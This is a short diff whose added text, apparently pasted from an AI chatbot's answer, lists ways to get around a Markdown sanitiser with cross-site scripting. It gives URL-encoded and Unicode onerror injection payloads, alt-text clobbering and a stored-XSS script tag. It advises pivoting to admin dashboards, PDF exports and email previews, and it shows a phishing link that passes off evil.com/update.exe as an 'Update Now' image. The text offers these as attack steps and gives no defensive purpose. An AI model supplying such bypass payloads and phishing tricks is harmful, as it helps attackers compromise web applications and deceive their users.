@@ -1,1 +1,67 @@
-![alt text](x" onerror="alert(1))
+What Might Still Work
+1. Valid Markdown syntax + malformed URL path for reflection
+Try:
+
+markdown
+Copy
+Edit
+![x](x%22%20onerror%3Dalert(1)%20bad%3D%22)
+→ Encoded " onerror=alert(1) bad="
+
+Decoded at render time, might result in:
+
+html
+Copy
+Edit
+<img src="x" onerror="alert(1)" bad="">
+If the Markdown parser decodes %22 → ", this could inject an attribute.
+
+2. Break with Unicode
+markdown
+Copy
+Edit
+![x](x%u0022%20onerror=alert(1))
+If the URL is decoded as UTF-16, it may trigger attribute confusion.
+
+3. Valid URL + clobbered alt text
+Try:
+
+markdown
+Copy
+Edit
+![x" onerror=alert(1)](x)
+This would render:
+
+html
+Copy
+Edit
+<img src="x" alt="x&quot; onerror=alert(1)">
+Still likely escaped, but might misrender in some Markdown engines or downstream HTML parsers (PDF, email clients, etc.).
+
+🔄 Recommended Pivot
+Since direct inline JS in image links is blocked:
+
+Look for alternate rendering layers:
+
+Admin dashboards
+
+PDF exports
+
+Email previews
+
+React dangerouslySetInnerHTML
+
+Target stored XSS via:
+
+markdown
+Copy
+Edit
+<script>alert(document.domain)</script>
+Abuse trusted image appearance:
+
+markdown
+Copy
+Edit
+[![Update Now](https://cdn.britannica.com/24/174524-050-A851D3F2/Oranges.jpg)](https://evil.com/update.exe)
+→ Phishing via image masquerade.
+
